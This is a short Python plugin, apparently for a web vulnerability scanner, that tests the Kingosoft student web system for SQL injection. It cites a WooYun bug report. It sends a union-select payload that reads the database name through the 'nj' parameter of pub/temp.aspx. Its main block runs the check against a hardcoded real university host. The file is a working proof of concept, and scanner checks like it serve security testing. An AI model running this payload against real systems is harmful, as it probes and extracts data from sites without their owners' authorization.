#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2010-087296

def assign(service, arg):
    if service == "kingosoft_xsweb":
        return True, arg


def audit(arg):
    payload = 'pub/temp.aspx?type=menu&nj=wooyun%27%20union%20all%20select%201,db_name(1)--'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'master' in res :
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('kingosoft_xsweb', 'http://stu.gxufe.cn/xsweb/')[1])